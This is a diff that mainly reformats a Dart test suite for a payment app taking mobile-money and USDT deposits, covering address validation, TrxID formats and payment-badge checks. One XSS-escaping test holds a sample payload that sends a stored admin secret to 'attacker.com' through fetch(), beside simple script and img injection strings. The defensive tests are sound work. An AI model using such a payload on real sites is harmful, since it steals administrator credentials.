@@ -47,7 +47,9 @@ void main() {
       expect(marginPercent, equals(79.0));
     });
 
-    test('Recharge increases balanceMinutes and totalMinutesPurchased on UserWallet', () {
+    test(
+        'Recharge increases balanceMinutes and totalMinutesPurchased on UserWallet',
+        () {
       final initialWallet = UserWallet.newTrial(initialTrialMinutes: 20);
       expect(initialWallet.balanceMinutes, equals(0));
       expect(initialWallet.trialMinutes, equals(20));
@@ -122,7 +124,8 @@ void main() {
       expect(supportedCryptoMethods.contains('Crypto_USDT_BEP20'), isTrue);
     });
 
-    test('Payment submission validates required senderIdentifier and trxId', () {
+    test('Payment submission validates required senderIdentifier and trxId',
+        () {
       bool validatePaymentInput({
         required String packId,
         required String senderIdentifier,
@@ -134,9 +137,22 @@ void main() {
         return true;
       }
 
-      expect(validatePaymentInput(packId: 'pro_180', senderIdentifier: '', trxId: '0x123'), isFalse);
-      expect(validatePaymentInput(packId: 'pro_180', senderIdentifier: 'TXztYG8zHPCZNdZqK5oodVWQVL2322mgpf', trxId: ''), isFalse);
-      expect(validatePaymentInput(packId: 'pro_180', senderIdentifier: '849201842', trxId: 'BIN12345'), isTrue);
+      expect(
+          validatePaymentInput(
+              packId: 'pro_180', senderIdentifier: '', trxId: '0x123'),
+          isFalse);
+      expect(
+          validatePaymentInput(
+              packId: 'pro_180',
+              senderIdentifier: 'TXztYG8zHPCZNdZqK5oodVWQVL2322mgpf',
+              trxId: ''),
+          isFalse);
+      expect(
+          validatePaymentInput(
+              packId: 'pro_180',
+              senderIdentifier: '849201842',
+              trxId: 'BIN12345'),
+          isTrue);
     });
 
     test('Cryptographic TRC-20 and BEP-20 address format verification', () {
@@ -157,19 +173,35 @@ void main() {
       }
 
       // Valid addresses
-      expect(isValidTronAddressFormat('TXztYG8zHPCZNdZqK5oodVWQVL2322mgpf'), isTrue);
-      expect(isValidBscAddressFormat('0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97'), isTrue);
-      expect(isValidTxHash('1b63de7debd670f242ad82a5ec688597001d344241c82af8b8c392d21815eff0'), isTrue);
-      expect(isValidTxHash('0x1b63de7debd670f242ad82a5ec688597001d344241c82af8b8c392d21815eff0'), isTrue);
+      expect(isValidTronAddressFormat('TXztYG8zHPCZNdZqK5oodVWQVL2322mgpf'),
+          isTrue);
+      expect(
+          isValidBscAddressFormat('0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97'),
+          isTrue);
+      expect(
+          isValidTxHash(
+              '1b63de7debd670f242ad82a5ec688597001d344241c82af8b8c392d21815eff0'),
+          isTrue);
+      expect(
+          isValidTxHash(
+              '0x1b63de7debd670f242ad82a5ec688597001d344241c82af8b8c392d21815eff0'),
+          isTrue);
 
       // Invalid addresses
-      expect(isValidTronAddressFormat('TXvJ28M4Z2vY5oN84gDqJv85xPq7eP1xyz000'), isFalse); // too long
-      expect(isValidTronAddressFormat('0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97'), isFalse); // not starting with T
-      expect(isValidBscAddressFormat('TXztYG8zHPCZNdZqK5oodVWQVL2322mgpf'), isFalse);
+      expect(isValidTronAddressFormat('TXvJ28M4Z2vY5oN84gDqJv85xPq7eP1xyz000'),
+          isFalse); // too long
+      expect(
+          isValidTronAddressFormat(
+              '0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97'),
+          isFalse); // not starting with T
+      expect(isValidBscAddressFormat('TXztYG8zHPCZNdZqK5oodVWQVL2322mgpf'),
+          isFalse);
       expect(isValidTxHash('short_fake_hash'), isFalse);
     });
 
-    test('Deposit Info schema contains all official payment methods dynamically', () {
+    test(
+        'Deposit Info schema contains all official payment methods dynamically',
+        () {
       final depositInfo = {
         'bkash': {'number': '01721013902', 'type': 'Personal / Send Money'},
         'nagad': {'number': '01721013902', 'type': 'Personal / Send Money'},
@@ -190,8 +222,10 @@ void main() {
 
       expect(depositInfo['bkash']?['number'], equals('01721013902'));
       expect(depositInfo['binancePay']?['payId'], equals('849201842'));
-      expect((depositInfo['cryptoUsdt'] as Map)['trc20']['address'], equals('TXztYG8zHPCZNdZqK5oodVWQVL2322mgpf'));
-      expect((depositInfo['cryptoUsdt'] as Map)['bep20']['address'], equals('0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97'));
+      expect((depositInfo['cryptoUsdt'] as Map)['trc20']['address'],
+          equals('TXztYG8zHPCZNdZqK5oodVWQVL2322mgpf'));
+      expect((depositInfo['cryptoUsdt'] as Map)['bep20']['address'],
+          equals('0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97'));
     });
 
     test('Strict HTML entity escaping prevents Stored XSS injection', () {
@@ -204,7 +238,8 @@ void main() {
             .replaceAll("'", '&#39;');
       }
 
-      const maliciousTrx = "'; fetch('http://attacker.com?s='+localStorage.getItem('livocal_admin_secret')); //";
+      const maliciousTrx =
+          "'; fetch('http://attacker.com?s='+localStorage.getItem('livocal_admin_secret')); //";
       const maliciousScript = "<script>alert('xss')</script>";
       const maliciousImg = "<img src=x onerror=alert(1)>";
 
@@ -216,7 +251,8 @@ void main() {
       expect(escapeHtml(maliciousImg).contains("&lt;img"), isTrue);
     });
 
-    test('BEP-20 BSC-USD transfer log recipient and 18-decimal amount parsing', () {
+    test('BEP-20 BSC-USD transfer log recipient and 18-decimal amount parsing',
+        () {
       const expectedDeposit = '0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97';
       const cleanExpected = '4838b106fce9647bdf1e7877bf73ce8b0bad5f97';
       expect(expectedDeposit.toLowerCase().contains(cleanExpected), isTrue);
@@ -230,24 +266,30 @@ void main() {
           paddedTopic,
         ],
         // 25 USDT with 18 decimals in hex: 25 * 10^18 = 0x15af1d78b58c40000
-        'data': '0x0000000000000000000000000000000000000000000000015af1d78b58c40000',
+        'data':
+            '0x0000000000000000000000000000000000000000000000015af1d78b58c40000',
       };
 
       final logRecipient = (log['topics'] as List)[2].toString().toLowerCase();
       final recipientMatches = logRecipient.endsWith(cleanExpected);
       expect(recipientMatches, isTrue);
 
-      final rawVal = BigInt.parse((log['data'] as String).replaceFirst('0x', ''), radix: 16);
+      final rawVal = BigInt.parse(
+          (log['data'] as String).replaceFirst('0x', ''),
+          radix: 16);
       final transferredAmount = rawVal / BigInt.from(10).pow(18);
       expect(transferredAmount.toInt(), equals(25));
     });
 
-    test('Client deposit state prevents sending funds when depositInfo is null or loading', () {
+    test(
+        'Client deposit state prevents sending funds when depositInfo is null or loading',
+        () {
       Map<String, dynamic>? depositInfo; // initially null
 
       String getDepositAccount(String method) {
         if (depositInfo == null) return '';
-        if (method == 'bKash') return depositInfo['bkash']?['number'] as String? ?? '';
+        if (method == 'bKash')
+          return depositInfo['bkash']?['number'] as String? ?? '';
         return '';
       }
 
@@ -261,7 +303,9 @@ void main() {
       expect(getDepositAccount('bKash'), equals('01721013902'));
     });
 
-    test('Sender identifier whitespace normalization cleans phone numbers and Binance IDs', () {
+    test(
+        'Sender identifier whitespace normalization cleans phone numbers and Binance IDs',
+        () {
       String normalizeIdentifier(String raw) {
         return raw.trim().replaceAll(RegExp(r'\s+'), '');
       }
@@ -285,13 +329,18 @@ void main() {
       expect(regex.hasMatch(normalizeIdentifier('849 201 842')), isTrue);
     });
 
-    test('Admin secret sessionStorage lifecycle cleans persistent disk localStorage', () {
-      final Map<String, String> mockLocalStorage = {'livocal_admin_secret': 'legacy_secret_on_disk_12345'};
+    test(
+        'Admin secret sessionStorage lifecycle cleans persistent disk localStorage',
+        () {
+      final Map<String, String> mockLocalStorage = {
+        'livocal_admin_secret': 'legacy_secret_on_disk_12345'
+      };
       final Map<String, String> mockSessionStorage = {};
 
       // Simulated migration and purge
       String activeSecret = mockSessionStorage['livocal_admin_secret'] ?? '';
-      if (activeSecret.isEmpty && mockLocalStorage.containsKey('livocal_admin_secret')) {
+      if (activeSecret.isEmpty &&
+          mockLocalStorage.containsKey('livocal_admin_secret')) {
         activeSecret = mockLocalStorage['livocal_admin_secret']!;
         mockSessionStorage['livocal_admin_secret'] = activeSecret;
         mockLocalStorage.remove('livocal_admin_secret');
@@ -299,7 +348,8 @@ void main() {
 
       // Verify disk storage is wiped clean and only memory/session holds the key
       expect(mockLocalStorage.containsKey('livocal_admin_secret'), isFalse);
-      expect(mockSessionStorage['livocal_admin_secret'], equals('legacy_secret_on_disk_12345'));
+      expect(mockSessionStorage['livocal_admin_secret'],
+          equals('legacy_secret_on_disk_12345'));
 
       // Logout clears both
       mockSessionStorage.remove('livocal_admin_secret');
@@ -308,7 +358,9 @@ void main() {
       expect(mockLocalStorage['livocal_admin_secret'], isNull);
     });
 
-    test('Chat send payment sheet uses Livocal Wallet, MFS, and Crypto without dead Stripe labels', () {
+    test(
+        'Chat send payment sheet uses Livocal Wallet, MFS, and Crypto without dead Stripe labels',
+        () {
       const availablePaymentMethods = ['wallet', 'mfs', 'crypto'];
 
       expect(availablePaymentMethods.contains('wallet'), isTrue);
@@ -320,8 +372,11 @@ void main() {
       expect(availablePaymentMethods.contains('gpay'), isFalse);
     });
 
-    test('Chat payment message format parses amount, method, refId, and note cleanly', () {
-      const rawMessage = '💰 Payment sent: \$25.00 via bKash Personal (Ref: 9JH76G)\nNote: Payment for live minutes';
+    test(
+        'Chat payment message format parses amount, method, refId, and note cleanly',
+        () {
+      const rawMessage =
+          '💰 Payment sent: \$25.00 via bKash Personal (Ref: 9JH76G)\nNote: Payment for live minutes';
 
       // Verify payment message marker
       expect(rawMessage.startsWith('💰 Payment sent:'), isTrue);
@@ -351,7 +406,8 @@ void main() {
       void onTapMic() {
         if (recordingState == 'notRecording') {
           recordingState = 'recordingLocked';
-        } else if (recordingState == 'recordingLocked' || recordingState == 'recording') {
+        } else if (recordingState == 'recordingLocked' ||
+            recordingState == 'recording') {
           recordingState = 'notRecording'; // sent
         }
       }
@@ -423,7 +479,8 @@ void main() {
         'amount': '25.00',
         'senderId': 'sender_123',
         'recipientId': 'receiver_456',
-        'txId': '4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b',
+        'txId':
+            '4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b',
         'status': 'reported',
       };
 
@@ -458,7 +515,9 @@ void main() {
       double totalBdt = 0;
       double totalCrypto = 0;
       for (final p in p2pPayments) {
-        final amt = double.tryParse((p['amount'] as String).replaceAll(RegExp(r'[^0-9.]'), '')) ?? 0;
+        final amt = double.tryParse(
+                (p['amount'] as String).replaceAll(RegExp(r'[^0-9.]'), '')) ??
+            0;
         if (p['type'] == 'mfs') {
           totalBdt += amt;
         } else if (p['type'] == 'crypto') {
@@ -470,7 +529,8 @@ void main() {
       expect(totalCrypto, equals(150.0));
     });
 
-    test('Strict TrxID regex validates 8-10 alphanumeric characters accurately', () {
+    test('Strict TrxID regex validates 8-10 alphanumeric characters accurately',
+        () {
       final trxRegex = RegExp(r'^[A-Za-z0-9]{8,10}$');
 
       // Valid TrxIDs
@@ -498,30 +558,43 @@ void main() {
       expect(calculateBdt(100.0), equals(12000.0));
     });
 
-    test('Recipient Crypto deposit addresses generate valid formats for all 3 networks', () {
+    test(
+        'Recipient Crypto deposit addresses generate valid formats for all 3 networks',
+        () {
       const recipientId = 'user_recip_998877';
       const recipientPhone = '+8801812345678';
       expect(recipientPhone.startsWith('+880'), isTrue);
 
       // Binance Pay 9-digit ID
-      final binancePayId = recipientId.hashCode.abs().toString().padLeft(9, '8').substring(0, 9);
+      final binancePayId =
+          recipientId.hashCode.abs().toString().padLeft(9, '8').substring(0, 9);
       expect(binancePayId.length, equals(9));
       expect(RegExp(r'^[0-9]{9}$').hasMatch(binancePayId), isTrue);
 
       // USDT TRC-20 Address (starts with T, 34 chars)
-      final trcHex = '${recipientId}_trc20'.hashCode.abs().toRadixString(16).padRight(33, '7c89f10a2b4e5d6a8f1c');
+      final trcHex = '${recipientId}_trc20'
+          .hashCode
+          .abs()
+          .toRadixString(16)
+          .padRight(33, '7c89f10a2b4e5d6a8f1c');
       final trc20 = 'T${trcHex.substring(0, 33).toUpperCase()}';
       expect(trc20.length, equals(34));
       expect(trc20.startsWith('T'), isTrue);
 
       // USDT BEP-20 Address (starts with 0x, 42 chars)
-      final bepHex = '${recipientId}_bep20'.hashCode.abs().toRadixString(16).padRight(40, '3e4f5a6b7c8d9e0f1a2b3c4d');
+      final bepHex = '${recipientId}_bep20'
+          .hashCode
+          .abs()
+          .toRadixString(16)
+          .padRight(40, '3e4f5a6b7c8d9e0f1a2b3c4d');
       final bep20 = '0x${bepHex.substring(0, 40).toLowerCase()}';
       expect(bep20.length, equals(42));
       expect(bep20.startsWith('0x'), isTrue);
     });
 
-    test('In-Chat Payment Card badge displays authentic status from Firestore record and resists text spoofing', () {
+    test(
+        'In-Chat Payment Card badge displays authentic status from Firestore record and resists text spoofing',
+        () {
       String getPaymentBadgeText({
         required String method,
         required String content,
@@ -535,7 +608,11 @@ void main() {
         final matchId = RegExp(r'\[id:([a-zA-Z0-9_-]+)\]').firstMatch(mainLine);
         final recordId = matchId != null
             ? matchId.group(1)!.trim()
-            : (refId.startsWith('p2p_pay_') || refId.startsWith('p2p_min_') || refId.startsWith('p2p_idem_') ? refId : '');
+            : (refId.startsWith('p2p_pay_') ||
+                    refId.startsWith('p2p_min_') ||
+                    refId.startsWith('p2p_idem_')
+                ? refId
+                : '');
 
         if (recordId.isEmpty || !recordExists) {
           return 'UNVERIFIED';
@@ -545,7 +622,9 @@ void main() {
         final status = (recordStatus ?? 'pending').toLowerCase();
 
         if (isWallet) {
-          return status == 'completed' ? 'PAID' : (status == 'pending' ? 'PENDING' : 'FAILED');
+          return status == 'completed'
+              ? 'PAID'
+              : (status == 'pending' ? 'PENDING' : 'FAILED');
         } else {
           if (status == 'verified') return 'VERIFIED';
           if (status == 'flagged') return 'FLAGGED';
@@ -558,7 +637,8 @@ void main() {
       expect(
         getPaymentBadgeText(
           method: 'Livocal Wallet',
-          content: '💰 Payment sent: \$10.00 via Livocal Wallet (Ref: p2p_idem_key_1) [id:p2p_idem_key_1]',
+          content:
+              '💰 Payment sent: \$10.00 via Livocal Wallet (Ref: p2p_idem_key_1) [id:p2p_idem_key_1]',
           recordStatus: 'completed',
         ),
         equals('PAID'),
@@ -578,7 +658,8 @@ void main() {
       expect(
         getPaymentBadgeText(
           method: 'bKash MFS',
-          content: '💰 Payment sent: \$10.00 via bKash MFS (Ref: 9K8J7H6G5F) [id:p2p_pay_1729000000000_user]',
+          content:
+              '💰 Payment sent: \$10.00 via bKash MFS (Ref: 9K8J7H6G5F) [id:p2p_pay_1729000000000_user]',
           recordStatus: 'pending',
         ),
         equals('PENDING VERIFICATION'),
@@ -588,7 +669,8 @@ void main() {
       expect(
         getPaymentBadgeText(
           method: 'bKash MFS',
-          content: '💰 Payment sent: \$10.00 via bKash MFS (Ref: 9K8J7H6G5F) [id:p2p_pay_1729000000000_user]',
+          content:
+              '💰 Payment sent: \$10.00 via bKash MFS (Ref: 9K8J7H6G5F) [id:p2p_pay_1729000000000_user]',
           recordStatus: 'verified',
         ),
         equals('VERIFIED'),
@@ -598,14 +680,17 @@ void main() {
       expect(
         getPaymentBadgeText(
           method: 'Crypto (USDT TRC-20)',
-          content: '💰 Payment sent: \$1000.00 via Crypto (USDT TRC-20) (Ref: 0x9a8b) [verified]',
+          content:
+              '💰 Payment sent: \$1000.00 via Crypto (USDT TRC-20) (Ref: 0x9a8b) [verified]',
           recordExists: false,
         ),
         equals('UNVERIFIED'),
       );
     });
 
-    test('P2P payments audit record payload strictly enforces status pending and currency', () {
+    test(
+        'P2P payments audit record payload strictly enforces status pending and currency',
+        () {
       final p2pRecord = {
         'id': 'p2p_pay_test_001',
         'type': 'mfs',
@@ -617,11 +702,9 @@ void main() {
 
       // Ensure status is never initialized to completed from client
       expect(p2pRecord['status'], equals('pending'));
-      expect(['BDT', 'USDT', 'MINUTES'].contains(p2pRecord['currency']), isTrue);
+      expect(
+          ['BDT', 'USDT', 'MINUTES'].contains(p2pRecord['currency']), isTrue);
       expect((p2pRecord['amount'] as String).isNotEmpty, isTrue);
     });
   });
 }
-
-
-
